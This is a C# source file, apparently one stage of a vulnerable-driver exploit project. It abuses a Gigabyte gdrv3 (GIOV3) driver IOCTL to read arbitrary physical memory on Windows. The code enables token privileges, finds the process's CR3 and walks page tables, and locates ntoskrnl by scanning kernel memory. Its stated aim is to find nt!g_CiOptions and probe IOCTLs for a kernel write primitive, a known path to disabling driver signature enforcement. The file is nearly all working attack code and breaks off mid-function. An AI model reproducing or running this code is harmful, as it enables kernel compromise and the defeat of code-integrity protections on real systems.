// ============================================================================
// p37_prov.cs - kernel-RAM write-primitive prover + g_CiOptions locator.
// Loaded by p37_write.ps1 via Add-Type -Path (in-box csc, C# 5).
//
// p36 answered the READ side (gdrv3 0xC3502014, VERIFIED) and killed W1/W2.
// p37 only asks the two remaining questions:
//   X  where are CR3, ntoskrnl and nt!g_CiOptions  (read-only discovery)
//   W  is there a RAM WRITE behind 0xC3502014 role reversal, 0xC3502019
//      (MapMem_Phys_To_Linear2) or 0xC3502808 (Copy_Userbuf_To_Phys)?
//
// Call contracts are copied from the YccDrvv3.dll call sites in
// temp\drv\map_ioctls.txt (0x2014 @0x18000295F, 0x2019 @0x180002A2D,
// 0x2800 @0x1800026A4, 0x2808 @0x18000280F, 0x2580 @0x180001CA7): all of them
// are in-buffer on the stack, lpOutBuffer=NULL, nOutBuffer=0 and the
// 2014/2019/2808 in-struct is {u64, u32 size, u32 pad, u64}.  The prior G7
// false negative passed an out-buffer; the prior 2014 "write is FALSE" probe
// used 28 bytes instead of 0x18.  Both mistakes are NOT repeated.
//
// HARD RULE (ext\gio.py): gdrv3 maps a PA without validating backing RAM, so a
// PA in a hole bugchecks the box - every read here goes through InRamSpan(),
// which honours the resource-map ranges AND the crash-learned BADPA blacklist.
// ============================================================================
using System;
using System.Runtime.InteropServices;
using System.Text;

public static class P37Prov
{
    const uint GENERIC_READ = 0x80000000, GENERIC_WRITE = 0x40000000;
    const uint OPEN_EXISTING = 3, FILE_ATTRIBUTE_NORMAL = 0x80;
    const uint MEM_COMMIT = 0x1000, MEM_RESERVE = 0x2000, MEM_RELEASE = 0x8000;
    const uint PAGE_READWRITE = 0x04;
    const uint TOKEN_ADJUST_PRIVILEGES = 0x20, TOKEN_QUERY = 0x8;
    const uint SE_PRIVILEGE_ENABLED = 0x2;
    const long INVALID_HANDLE = -1;
    const ulong PFN_MASK = 0x000FFFFFFFFFF000UL;
    const ulong PFN_MASK_1G = 0x000FFFFFC0000000UL;
    const ulong PFN_MASK_2M = 0x000FFFFFFFE00000UL;

    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    static extern IntPtr CreateFileW(string name, uint access, uint share, IntPtr sa,
                                     uint disp, uint flags, IntPtr tmpl);
    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool DeviceIoControl(IntPtr h, uint code, IntPtr inBuf, uint inLen,
                                       IntPtr outBuf, uint outLen, out uint ret, IntPtr ov);
    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool CloseHandle(IntPtr h);
    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr VirtualAlloc(IntPtr addr, IntPtr size, uint type, uint prot);
    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool VirtualFree(IntPtr addr, IntPtr size, uint type);
    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool VirtualLock(IntPtr addr, IntPtr size);
    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool VirtualUnlock(IntPtr addr, IntPtr size);
    [DllImport("kernel32.dll")]
    static extern IntPtr GetCurrentProcess();
    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool SetProcessWorkingSetSize(IntPtr proc, IntPtr min, IntPtr max);
    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool GetPhysicallyInstalledSystemMemory(out ulong kb);
    [DllImport("advapi32.dll", SetLastError = true)]
    static extern bool OpenProcessToken(IntPtr proc, uint access, out IntPtr tok);
    [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    static extern bool LookupPrivilegeValueW(string sys, string name, out LUID luid);
    [DllImport("advapi32.dll", SetLastError = true)]
    static extern bool AdjustTokenPrivileges(IntPtr tok, bool disableAll,
                                             ref TOKEN_PRIVILEGES np, uint len,
                                             IntPtr prev, IntPtr retLen);

    // x64: LUID at offset 4 (Pack=4), Attributes at 12, size 16 - see p36.
    [StructLayout(LayoutKind.Sequential, Pack = 4)]
    struct LUID { public uint Low; public int High; }
    [StructLayout(LayoutKind.Sequential, Pack = 4)]
    struct TOKEN_PRIVILEGES { public uint Count; public LUID Luid; public uint Attr; }

    static IntPtr g_Stage;
    static int g_StageLen;

    public static string EnablePriv(string name)
    {
        IntPtr tok; LUID luid;
        if (!OpenProcessToken(new IntPtr(-1), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, out tok))
            return "OpenProcessToken err=" + Marshal.GetLastWin32Error();
        if (!LookupPrivilegeValueW(null, name, out luid))
            return "LookupPrivilegeValue err=" + Marshal.GetLastWin32Error();
        TOKEN_PRIVILEGES tp = new TOKEN_PRIVILEGES();
        tp.Count = 1; tp.Luid = luid; tp.Attr = SE_PRIVILEGE_ENABLED;
        bool ok = AdjustTokenPrivileges(tok, false, ref tp, 0, IntPtr.Zero, IntPtr.Zero);
        int err = Marshal.GetLastWin32Error();
        CloseHandle(tok);
        if (!ok) return "AdjustTokenPrivileges err=" + err;
        if (err == 1300) return "NOT_ASSIGNED (absent from token)";
        return "ok";
    }

    // locked landing buffer for every 0x2014 read (proven p36 discipline)
    // The driver caches the staging pointer across calls, so the buffer must keep
    // the SAME address for the life of the process: it is allocated once at a fixed
    // VA, locked, and never freed. Growing by free+realloc (p37 pre-fix) left the
    // driver dereferencing freed VA on the next call -> err 1450, then a 0x3B AV.
    const ulong STAGE_VA = 0x16000000;
    const int STAGE_MAX = 0x200000;

    public static ulong StageVa { get { if (g_Stage == IntPtr.Zero) Stage(0x1000); return (ulong)g_Stage.ToInt64(); } }
    public static bool StageLocked;

    static IntPtr Stage(int size)
    {
        if (g_Stage != IntPtr.Zero)
        {
            if (size > STAGE_MAX) throw new Exception("stage request 0x" + size.ToString("x") + " > max 0x" + STAGE_MAX.ToString("x"));
            return g_Stage;
        }
        int want = Math.Max(STAGE_MAX, size);
        g_Stage = VirtualAlloc(new IntPtr((long)STAGE_VA), new IntPtr(want), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (g_Stage == IntPtr.Zero) g_Stage = VirtualAlloc(IntPtr.Zero, new IntPtr(want), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (g_Stage == IntPtr.Zero) throw new Exception("VirtualAlloc err=" + Marshal.GetLastWin32Error());
        // Fault the pages in first: the first VirtualLock of a large range in a
        // fresh session-0 process fails 1453 on the untouched working set.
        for (int i = 0; i < want; i += 0x1000) Marshal.WriteByte(g_Stage, i, 0);
        SetProcessWorkingSetSize(GetCurrentProcess(), new IntPtr(4 << 20), new IntPtr(64 << 20));
        bool locked = false;
        for (int t = 0; t < 5 && !locked; t++)
        {
            locked = VirtualLock(g_Stage, new IntPtr(want));
            if (!locked) { LastErr = Marshal.GetLastWin32Error(); System.Threading.Thread.Sleep(10); }
        }
        if (!locked) locked = VirtualLock(g_Stage, new IntPtr(0x1000));   // page-only fallback
        StageLocked = locked;
        if (!locked) LastErr = Marshal.GetLastWin32Error();
        g_StageLen = want;
        return g_Stage;
    }

    // ---- RAM truth table ----------------------------------------------------
    // Same source and same lesson as p36: "pa < ramTop" is NOT a RAM test (the
    // PCI/MMIO hole sits below ramTop on a 32 GB box).  Only the resource map's
    // CmResourceTypeMemory descriptors count.
    public static ulong[] RamStarts = new ulong[0];
    public static ulong[] RamEnds = new ulong[0];
    public static ulong RamTopFallback;

    public static void SetRamRanges(string csv, ulong ramTop)
    {
        RamTopFallback = ramTop;
        if (RamTopFallback == 0) RamTopFallback = 0x800000000UL;   // unknown -> 32 GB, never 0
        if (string.IsNullOrEmpty(csv)) { RamStarts = new ulong[0]; RamEnds = new ulong[0]; return; }
        string[] p = csv.Split(',');
        ulong[] s = new ulong[p.Length];
        ulong[] e = new ulong[p.Length];
        int n = 0;
        for (int i = 0; i < p.Length; i++)
        {
            int d = p[i].IndexOf('-');
            if (d <= 0) continue;
            s[n] = Convert.ToUInt64(p[i].Substring(0, d), 16);
            e[n] = Convert.ToUInt64(p[i].Substring(d + 1), 16);
            if (e[n] > s[n]) n++;
        }
        RamStarts = new ulong[n]; RamEnds = new ulong[n];
        Array.Copy(s, RamStarts, n); Array.Copy(e, RamEnds, n);
    }

    const int HKEY_LOCAL_MACHINE = unchecked((int)0x80000002);
    const int KEY_READ = 0x20019;
    [DllImport("advapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
    static extern int RegOpenKeyEx(IntPtr root, string sub, int opt, int sam, out IntPtr hk);
    [DllImport("advapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
    static extern int RegQueryValueEx(IntPtr hk, string name, IntPtr res, out int type, byte[] data, ref int cb);
    [DllImport("advapi32.dll")]
    static extern int RegCloseKey(IntPtr hk);

    public static string RamRangesFromRegistry()
    {
        IntPtr hk;
        int st = RegOpenKeyEx(new IntPtr(HKEY_LOCAL_MACHINE),
                              @"HARDWARE\RESOURCEMAP\System Resources\Physical Memory",
                              0, KEY_READ, out hk);
        if (st != 0) return "open=0x" + st.ToString("x");
        try
        {
            int type = 0, cb = 0;
            st = RegQueryValueEx(hk, ".Translated", IntPtr.Zero, out type, null, ref cb);
            if (st != 0 || cb <= 0) return "query=0x" + st.ToString("x") + " cb=" + cb;
            byte[] rb = new byte[cb];
            st = RegQueryValueEx(hk, ".Translated", IntPtr.Zero, out type, rb, ref cb);
            if (st != 0) return "read=0x" + st.ToString("x") + " type=" + type;
            if (cb < 16) return "short cb=" + cb + " type=" + type;
            int off = 4;
            uint cnt = BitConverter.ToUInt32(rb, 0);
            StringBuilder sb = new StringBuilder();
            int guard = 0;
            for (uint l = 0; l < cnt && off + 16 <= cb; l++)
            {
                off += 12;
                if (off + 4 > cb) break;
                uint n = BitConverter.ToUInt32(rb, off); off += 4;
                // 20-byte descriptors: type(1)+share(1)+flags(2)+start(8)+len(8);
                // type 7 = CmResourceTypeMemoryLarge with flags at +2 scaling len.
                for (uint d = 0; d < n && off + 20 <= cb && guard++ < 4096; d++)
                {
                    byte t = rb[off];
                    ushort flags = BitConverter.ToUInt16(rb, off + 2);
                    ulong s0 = BitConverter.ToUInt64(rb, off + 4);
                    ulong ln = BitConverter.ToUInt64(rb, off + 12);
                    off += 20;
                    if (ln == 0) continue;
                    if (t == 7)
                    {
                        if ((flags & 0x0200) != 0) ln <<= 8;
                        else if ((flags & 0x0400) != 0) ln <<= 16;
                        else if ((flags & 0x0800) != 0) ln <<= 32;
                    }
                    if (t == 3 || t == 7)
                    {
                        if (sb.Length > 0) sb.Append(',');
                        sb.Append(s0.ToString("x")).Append('-').Append((s0 + ln).ToString("x"));
                    }
                }
            }
            return sb.Length > 0 ? sb.ToString() : "no-memory-descriptors cb=" + cb;
        }
        finally { RegCloseKey(hk); }
    }

    // crash-learned holes (p37_badpa.txt, seeded from p36_badpa.txt)
    public static ulong[] BadStarts = new ulong[0];
    public static ulong[] BadEnds = new ulong[0];

    // The file is append-only and sometimes hand-edited, so the parser has to be
    // defensive.  A span typed as 127c00000-14000000 (end 0x14000000 instead of
    // 0x140000000) used to be dropped silently: e <= s meant "no range", the
    // whole 388 MB blanket vanished for a night and the walk died again inside
    // it.  Inverted pairs are now swapped rather than discarded, unparsable ones
    // are counted so the caller can shout, and the list is kept sorted by start
    // so IsBad can break out early.
    public static int BadRejected;
    public static int BadRepaired;

    public static void SetBadRanges(string csv)
    {
        if (string.IsNullOrEmpty(csv)) return;
        string[] p = csv.Split(',');
        ulong[] s = new ulong[p.Length];
        ulong[] e = new ulong[p.Length];
        int n = 0;
        BadRejected = 0;
        BadRepaired = 0;
        for (int i = 0; i < p.Length; i++)
        {
            int d = p[i].IndexOf('-');
            if (d <= 0) { if (p[i].Trim().Length > 0) BadRejected++; continue; }
            ulong a, b;
            string sa, sb;
            try
            {
                sa = p[i].Substring(0, d).Trim();
                sb = p[i].Substring(d + 1).Trim();
                a = Convert.ToUInt64(sa, 16);
                b = Convert.ToUInt64(sb, 16);
            }
            catch { BadRejected++; continue; }
            if (b < a)
            {
                // A *shorter* end than start is the signature of a dropped trailing
                // zero (14000000 typed for 140000000): rebuild it by nibble shifts,
                // which restores a span that actually reaches the crash.  Equal
                // lengths mean a plain inversion (900000-800000), where swapping
                // is the exact intent and shifting would inflate 1 MB to 119 MB.
                if (sb.Length < sa.Length)
                {
                    ulong b2 = b;
                    while (b2 < a && b2 <= (ulong.MaxValue >> 4)) b2 <<= 4;
                    if (b2 > a) b = b2; else { ulong t = a; a = b; b = t; }
                }
                else { ulong t = a; a = b; b = t; }
                BadRepaired++;
            }
            if (b == a) { BadRejected++; continue; }
            s[n] = a; e[n] = b; n++;
        }
        Array.Resize(ref s, n);
        Array.Resize(ref e, n);
        Array.Sort(s, e);              // keyed on start, ends ride along
        BadStarts = s; BadEnds = e;
    }

    public static bool IsBad(ulong pa, int size)
    {
        ulong hi = pa + (ulong)size;
        for (int i = 0; i < BadStarts.Length; i++)
        {
            if (BadStarts[i] >= hi) break;   // sorted: no later range can touch [pa,hi)
            if (BadEnds[i] > pa) return true;
        }
        return false;
    }

    // total blacklisted span in bytes, overlapping ranges counted once - logged so
    // a mistyped blanket shows up as an absurd size before the walk starts
    public static ulong BlacklistedBytes()
    {
        ulong tot = 0, curS = 0, curE = 0;
        for (int i = 0; i < BadStarts.Length; i++)
        {
            if (BadStarts[i] > curE) { tot += curE - curS; curS = BadStarts[i]; curE = BadEnds[i]; }
            else if (BadEnds[i] > curE) curE = BadEnds[i];
        }
        return tot + (curE - curS);
    }

    // The blacklist gates BULK reads.  The seed covers every 2 MiB block below
    // 32 MiB, and that is exactly the region the 15:12 0x3B landed in while a
    // 1 MiB walk was marching through it - skipping it is what lets a whole-RAM
    // pass finish without repeating the bugcheck.  (p36 had set this false
    // because single canary pages down there read fine, but "that page reads"
    // and "a 1 MiB chunk there survives" are different claims.)
    //
    // Probe reads (G0 canary at 0x1000/0x100000, chunk ladder) use
    // InRamSpanNoBad(): those pages are proven readable, so gating them would
    // only blind the diagnostics.  UseBadForReads=false turns the bulk gate
    // back off for the "is the region really the culprit?" experiment.
    public static bool UseBadForReads = true;

    static bool SpanOk(ulong pa, int size, bool bad)
    {
        if (bad && IsBad(pa, size)) return false;
        if (RamEnds.Length == 0)
        {
            if (RamTopFallback == 0) return true;
            return pa + (ulong)size <= RamTopFallback && !(pa < 0x100000 && pa + (ulong)size > 0xA0000);
        }
        for (int i = 0; i < RamEnds.Length; i++)
            if (pa >= RamStarts[i] && pa + (ulong)size <= RamEnds[i]) return true;
        return false;
    }

    public static bool InRam(ulong pa) { return SpanOk(pa, 1, UseBadForReads); }

    public static bool InRamSpan(ulong pa, int size) { return SpanOk(pa, size, UseBadForReads); }

    // probe variant: RAM-checked, crash-learned blacklist deliberately bypassed
    public static bool InRamSpanNoBad(ulong pa, int size) { return SpanOk(pa, size, false); }

    // ---- read primitive (VERIFIED 0xC3502014, in-only 0x18, out=NULL) --------
    public delegate void Note(string s);
    public static Note Notify;

    public static int SkippedOutOfRam;
    public static int Issued;
    public static ulong LastIssuedPa;
    static ulong LastNoteBlock = ulong.MaxValue;   // one breadcrumb per 2 MiB block

    public static string GdrvOpen(out IntPtr h)
    {
        h = CreateFileW(@"\\.\GIOV3", GENERIC_READ | GENERIC_WRITE, 0, IntPtr.Zero,
                        OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, IntPtr.Zero);
        if (h.ToInt64() == INVALID_HANDLE) return "err=" + Marshal.GetLastWin32Error();
        return "";
    }

    // VERIFIED call discipline: one validated span per IOCTL, locked dst, out=NULL.
    // 1450 (ERROR_NO_SYSTEM_RESOURCES) returns zeros so a scan misses one chunk
    // instead of dying (p36 finding).
    public static int LastErr;
    public static int Last1450;

    public static byte[] GdrvReadOneRaw(IntPtr h, ulong pa, int size)
    {
        IntPtr stage = Stage(Math.Max(size, 0x1000));
        IntPtr inb = Marshal.AllocHGlobal(0x18);
        try
        {
            Marshal.WriteInt64(inb, 0x00, (long)pa);
            Marshal.WriteInt32(inb, 0x08, size);
            Marshal.WriteInt32(inb, 0x0C, 0);
            Marshal.WriteInt64(inb, 0x10, stage.ToInt64());
            LastIssuedPa = pa; Issued++;
            // Durable breadcrumb BEFORE the IOCTL: if gdrv3 bugchecks us, the PA
            // that killed the box is already on disk (written and flushed by the
            // caller's Notify hook).  One record per 2 MiB block keeps the file
            // small while matching the blacklist granularity exactly - and the
            // block's start PA is what the next run blacklists.
            ulong blk = pa >> 21;
            if (blk != LastNoteBlock)
            {
                LastNoteBlock = blk;
                if (Notify != null)
                    Notify(string.Format("  [io] read pa=0x{0:x} size=0x{1:x}{2}", pa, size,
                                         InRamSpanNoBad(pa, size) ? "" : "   <<< NOT RAM-BACKED"));
            }
            uint got;
            bool ok = DeviceIoControl(h, 0xC3502014, inb, 0x18, IntPtr.Zero, 0, out got, IntPtr.Zero);
            LastErr = ok ? 0 : Marshal.GetLastWin32Error();
            if (!ok && LastErr == 1450) { Last1450++; return new byte[size]; }
            if (!ok)
                throw new Exception("read pa=0x" + pa.ToString("x") + " size=0x" + size.ToString("x")
                                    + " err=" + Marshal.GetLastWin32Error());
            byte[] res = new byte[size];
            Marshal.Copy(stage, res, 0, size);
            return res;
        }
        finally { Marshal.FreeHGlobal(inb); }
    }

    // null distinguishes "handle returned 1450" from "page really is zeros"
    public static byte[] GdrvReadStrict(IntPtr h, ulong pa, int size)
    {
        byte[] r;
        try { r = GdrvReadOneRaw(h, pa, size); } catch { return null; }
        if (LastErr == 1450) return null;
        return r;
    }

    public static byte[] GdrvReadOne(IntPtr h, ulong pa, int size)
    {
        if (!InRamSpan(pa, size))
        {
            SkippedOutOfRam++;
            if (Notify != null) Notify(string.Format("  [io] SKIP pa=0x{0:x} size=0x{1:x} (hole/not RAM)", pa, size));
            return new byte[size];
        }
        return GdrvReadOneRaw(h, pa, size);
    }

    // Probe read: RAM-checked but blacklist-blind.  ONLY for the G0 canary and
    // the chunk ladder - pages that are already proven readable.
    public static byte[] GdrvProbe(IntPtr h, ulong pa, int size)
    {
        if (!InRamSpanNoBad(pa, size))
        {
            SkippedOutOfRam++;
            if (Notify != null) Notify(string.Format("  [io] SKIP probe pa=0x{0:x} size=0x{1:x} (not RAM)", pa, size));
            return new byte[size];
        }
        return GdrvReadOneRaw(h, pa, size);
    }

    public static byte[] GdrvRead(IntPtr h, ulong pa, int size)
    {
        const int CH = 0x1000;
        byte[] outb = new byte[size];
        int off = 0;
        while (off < size)
        {
            int n = Math.Min(CH, size - off);
            byte[] part = GdrvReadOne(h, pa + (ulong)off, n);
            Array.Copy(part, 0, outb, off, n);
            off += n;
        }
        return outb;
    }

    public static ulong RdQ(IntPtr h, ulong pa) { return BitConverter.ToUInt64(GdrvRead(h, pa, 8), 0); }
    public static uint RdD(IntPtr h, ulong pa) { return BitConverter.ToUInt32(GdrvRead(h, pa, 4), 0); }

    public static string Hex(byte[] b)
    {
        StringBuilder sb = new StringBuilder(b.Length * 3);
        for (int i = 0; i < b.Length; i++) { sb.Append(b[i].ToString("x2")); if (i + 1 < b.Length) sb.Append(' '); }
        return sb.ToString();
    }

    // ---- chunked span walker -------------------------------------------------
    // Iterates [start,end) in large validated chunks: a chunk never crosses a RAM
    // range end or a BADPA range, so 128 KiB/u200000 reads stay legal.  The body
    // returns false to stop.  Returns the number of bytes read.
    public static ulong WalkChunks(IntPtr g, ulong start, ulong end, int maxChunk,
                                   Func<byte[], ulong, int, bool> body)
    {
        ulong pa = start; ulong total = 0; int since = 0;
        while (pa < end)
        {
            int n = (int)Math.Min((ulong)maxChunk, end - pa);
            if (n < 0x1000) n = (int)Math.Min((ulong)0x1000, end - pa);
            if ((ulong)n > 0x1000 && !InRamSpan(pa, n))
            {
                n = 0x1000;
                while (n + 0x1000 <= maxChunk && pa + (ulong)(n + 0x1000) <= end
                       && InRamSpan(pa, n + 0x1000)) n += 0x1000;
            }
            if (!InRamSpan(pa, n)) { pa += (ulong)n; continue; }
            byte[] b = GdrvReadOneRaw(g, pa, n);
            total += (ulong)n;
            since += n;
            if (since >= 0x1000000)
            {
                since = 0;
                if (Notify != null) Notify(string.Format("  [scan] at pa=0x{0:x} ({1} MB read)", pa, total >> 20));
            }
            if (!body(b, pa, n)) break;
            pa += (ulong)n;
        }
        return total;
    }

    // ---- X1: chunk size the driver tolerates in ONE read ---------------------
    // The ladder proved 0x20000 already; a bigger chunk cuts the whole-RAM scan
    // from ~9M IOCTLs to thousands.  Measured, not assumed: two PAs must pass.
    public static int ChunkSize(IntPtr g, ulong[] probes, out string rep)
    {
        rep = "";
        int[] sizes = new int[] { 0x100000, 0x80000, 0x40000, 0x20000, 0x10000 };
        int best = 0;
        for (int i = 0; i < sizes.Length; i++)
        {
            bool all = true;
            for (int k = 0; k < probes.Length; k++)
            {
                if (!InRamSpanNoBad(probes[k], sizes[i])) { all = false; break; }
                try
                {
                    byte[] b = GdrvReadOneRaw(g, probes[k], sizes[i]);
                    if (b.Length != sizes[i]) all = false;
                }
                catch (Exception e)
                {
                    rep += string.Format("  0x{0:x} FAIL {1}\r\n", sizes[i], e.Message);
                    all = false;
                }
                if (!all) break;
            }
            if (all) { best = sizes[i]; rep += string.Format("  0x{0:x} OK on every probe PA\r\n", sizes[i]); break; }
            rep += string.Format("  0x{0:x} not usable\r\n", sizes[i]);
        }
        return best;
    }

    // ---- X2: PML4 self-reference scan -> CR3 --------------------------------
    // PXE_BASE 0xFFFFF6FB7DBED000 -> PML4 index 0x1ED must point at the PML4
    // itself and the kernel half must be populated.  Other processes' PML4s
    // satisfy that too, so every candidate must additionally translate
    // userVa (a page of OURS holding userTag) - that makes CR3 provably ours.
    // Scans low AND high RAM (p36 only ever looked below 1 GB).
    public static string ScanPml4(IntPtr g, ulong ramTop, int chunk, ulong userVa, byte userTag,
                                  out ulong cr3, out string notes, out ulong scanned)
    {
        cr3 = 0; notes = ""; scanned = 0;
        ulong best = 0; int cands = 0; int foreign = 0;
        string nts = "";
        for (int ri = 0; ri < RamEnds.Length && best == 0; ri++)
        {
            ulong s = Math.Max(RamStarts[ri], 0x1000);
            ulong e = Math.Min(RamEnds[ri], ramTop);
            if (e <= s) continue;
            scanned += WalkChunks(g, s, e, chunk, delegate(byte[] b, ulong pab, int n)
            {
                for (int o = 0; o + 0x1000 <= n; o += 0x1000)
                {
                    int ef = o + 0x1ED * 8;
                    if (ef + 8 > n) break;
                    ulong page = pab + (ulong)o;
                    ulong ev = BitConverter.ToUInt64(b, ef);
                    if ((ev & 1) == 0) continue;
                    if ((ev & PFN_MASK) != page) continue;
                    int present = 0;
                    for (int k = 0x100; k < 0x200; k++)
                        if ((RdQ(g, page + (ulong)k * 8) & 1) != 0) present++;
                    cands++;
                    if (present < 8) continue;
                    ulong upa;
                    if (!Walk(g, page, userVa, out upa)) { foreign++; continue; }
                    byte tb;
                    try { tb = GdrvRead(g, upa, 1)[0]; }
                    catch (Exception) { foreign++; continue; }
                    if (tb != userTag) { foreign++; continue; }
                    if (cands <= 5)
                        nts += string.Format("  cr3=0x{0:x} kernel_present={1} user_pa=0x{2:x} tag_ok\r\n", page, present, upa);
                    if (best == 0) { best = page; return false; }
                }
                return true;
            });
        }
        notes = nts + string.Format("  candidates={0} rejected_foreign={1}\r\n", cands, foreign);
        cr3 = best;
        return best == 0 ? "" : cands.ToString();
    }

    // ---- page walk -----------------------------------------------------------
    public static bool Walk(IntPtr g, ulong cr3, ulong va, out ulong pa)
    {
        pa = 0;
        ulong e = RdQ(g, cr3 + ((va >> 39) & 0x1FF) * 8);
        if ((e & 1) == 0) return false;
        ulong t = e & PFN_MASK;
        e = RdQ(g, t + ((va >> 30) & 0x1FF) * 8);
        if ((e & 1) == 0) return false;
        if ((e & 0x80) != 0) { pa = (e & PFN_MASK_1G) + (va & 0x3FFFFFFFUL); return true; }
        t = e & PFN_MASK;
        e = RdQ(g, t + ((va >> 21) & 0x1FF) * 8);
        if ((e & 1) == 0) return false;
        if ((e & 0x80) != 0) { pa = (e & PFN_MASK_2M) + (va & 0x1FFFFFUL); return true; }
        t = e & PFN_MASK;
        e = RdQ(g, t + ((va >> 12) & 0x1FF) * 8);
        if ((e & 1) == 0) return false;
        pa = (e & PFN_MASK) + (va & 0xFFFUL);
        return true;
    }

    // export-directory probe: is `want` one of the image's export names?
    public static string ExportHas(IntPtr g, ulong imgPa, int opt, int dirOff, string want)
    {
        try
        {
            byte[] d = GdrvRead(g, imgPa + (ulong)(opt + dirOff), 8);
            uint rva = BitConverter.ToUInt32(d, 0), sz = BitConverter.ToUInt32(d, 4);
            if (rva == 0 || sz < 0x28) return "no-dir";
            byte[] ed = GdrvRead(g, imgPa + rva, 0x28);
            uint count = BitConverter.ToUInt32(ed, 0x18);
            uint names = BitConverter.ToUInt32(ed, 0x20);
            if (count == 0 || count > 0x2000) return "no-names";
            byte[] tbl = GdrvRead(g, imgPa + names, (int)count * 4);
            for (uint i = 0; i < count; i++)
            {
                uint nrva = BitConverter.ToUInt32(tbl, (int)i * 4);
                byte[] nm = GdrvRead(g, imgPa + nrva, want.Length + 1);
                bool same = true;
                for (int k = 0; k < want.Length; k++) if (nm[k] != (byte)want[k]) { same = false; break; }
                if (same) return "yes";
            }
            return "no(" + count + ")";
        }
        catch (Exception) { return "err"; }
    }

    // validate "MZ + native amd64 PE + export" at one 2 MiB-aligned VA
    public static bool MzValidate(IntPtr g, ulong va, ulong pa, out string why, out uint imgSize)
    {
        why = ""; imgSize = 0;
        if ((va & 0x1FFFFF) != 0) { why = "unaligned"; return false; }
        if (!InRamSpan(pa, 0x400)) { why = "pa-not-ram"; return false; }
        byte[] hdr;
        try { hdr = GdrvRead(g, pa, 0x400); }
        catch (Exception e) { why = "read:" + e.Message; return false; }
        if (hdr[0] != 0x4D || hdr[1] != 0x5A) { why = "no-mz"; return false; }
        uint lf = BitConverter.ToUInt32(hdr, 0x3C);
        if (lf < 0x40 || lf > 0x200) { why = "lf"; return false; }
        int pe = (int)lf;
        if (BitConverter.ToUInt32(hdr, pe) != 0x00004550) { why = "no-pe"; return false; }
        if (BitConverter.ToUInt16(hdr, pe + 4) != 0x8664) { why = "not-x64"; return false; }
        int opt = pe + 0x18;
        if (BitConverter.ToUInt16(hdr, opt) != 0x20B) { why = "not-pe32+"; return false; }
        if (BitConverter.ToUInt16(hdr, opt + 0x44) != 10) { why = "not-native"; return false; }
        uint sz = BitConverter.ToUInt32(hdr, opt + 0x38);
        if (sz < 0x400000 || sz > 0x4000000) { why = "size=0x" + sz.ToString("x"); return false; }
        string ex = ExportHas(g, pa, opt, 0x70, "PsLookupProcessByProcessId");
        if (ex != "yes") { why = "export=" + ex; return false; }
        imgSize = sz;
        return true;
    }

    // ---- X3a: ntoskrnl from the LSTAR MSR (cheap, driver-truth) -------------
    // LSTAR is KiSystemCall64[Shadow] inside ntoskrnl .text.  The image base is
    // 2 MiB aligned within SizeOfImage (<= 64 MiB) BELOW that address, so walk
    // down and validate.
    public static string NtFromLstar(IntPtr g, ulong cr3, ulong lstar, out ulong vaBase,
                                     out uint imgSize, out string hits)
    {
        vaBase = 0; imgSize = 0; hits = "";
        if (lstar < 0xFFFFF80000000000UL) return "lstar-not-kernel";
        ulong baseVa = lstar & ~0x1FFFFFUL;
        for (int back = 0; back <= 32; back++)
        {
            ulong va = baseVa - (ulong)back * 0x200000UL;
            ulong pa;
            if (!Walk(g, cr3, va, out pa)) continue;
            string why; uint sz;
            if (!MzValidate(g, va, pa, out why, out sz))
            {
                if (back < 6 || why == "export=yes") 
                    hits += string.Format("  va=0x{0:x} -> pa=0x{1:x} {2}\r\n", va, pa, why);
                continue;
            }
            vaBase = va; imgSize = sz;
            hits += string.Format("  NT! va=0x{0:x} pa=0x{1:x} sizeOfImage=0x{2:x} (lstar-{3}M)\r\n",
                                  va, pa, sz, back * 2);
            return "1";
        }
        return "";
    }

    // ---- X3b: ntoskrnl by walking the kernel window (LSTAR fallback) --------
    // Only PML4 0x1F0/0x1F1 (0xFFFFF80000000000-0xFFFFF87FFFFFFF) can carry the
    // image.  Large pages are checked directly; 4 KiB mappings via PTE[0].
    public static string ScanNtWin(IntPtr g, ulong cr3, out ulong vaBase, out uint imgSize, out string hits)
    {
        vaBase = 0; imgSize = 0; hits = "";
        int reads = 0;
        for (int i = 0x1F0; i <= 0x1F1 && vaBase == 0; i++)
        {
            ulong e = RdQ(g, cr3 + (ulong)i * 8); reads++;
            if ((e & 1) == 0 || (e & 0x80) != 0) continue;
            ulong pdpt = e & PFN_MASK;
            for (int j = 0; j < 512 && vaBase == 0; j++)
            {
                ulong e2 = RdQ(g, pdpt + (ulong)j * 8); reads++;
                if ((e2 & 1) == 0) continue;
                ulong va2 = 0xFFFF000000000000UL | ((ulong)i << 39) | ((ulong)j << 30);
                if ((e2 & 0x80) != 0)
                {
                    ulong pa = e2 & PFN_MASK_1G;
                    string why; uint sz;
                    if (MzValidate(g, va2, pa, out why, out sz)) { vaBase = va2; imgSize = sz; hits += "  1G page hit\r\n"; break; }
                    continue;
                }
                ulong pd = e2 & PFN_MASK;
                for (int k = 0; k < 512 && vaBase == 0; k++)
                {
                    ulong e3 = RdQ(g, pd + (ulong)k * 8); reads++;
                    if ((e3 & 1) == 0) continue;
                    ulong va3 = va2 | ((ulong)k << 21);
                    if ((e3 & 0x80) != 0)
                    {
                        ulong pa = e3 & PFN_MASK_2M;
                        string why; uint sz;
                        if (MzValidate(g, va3, pa, out why, out sz)) { vaBase = va3; imgSize = sz; hits += "  2M page hit\r\n"; break; }
                        continue;
                    }
                    ulong pt = e3 & PFN_MASK;
                    ulong e4 = RdQ(g, pt); reads++;
                    if ((e4 & 1) == 0) continue;
                    ulong pa4 = e4 & PFN_MASK;
                    string w4; uint s4;
                    if (MzValidate(g, va3, pa4, out w4, out s4)) { vaBase = va3; imgSize = s4; hits += "  4K page hit\r\n"; break; }
                }
            }
        }
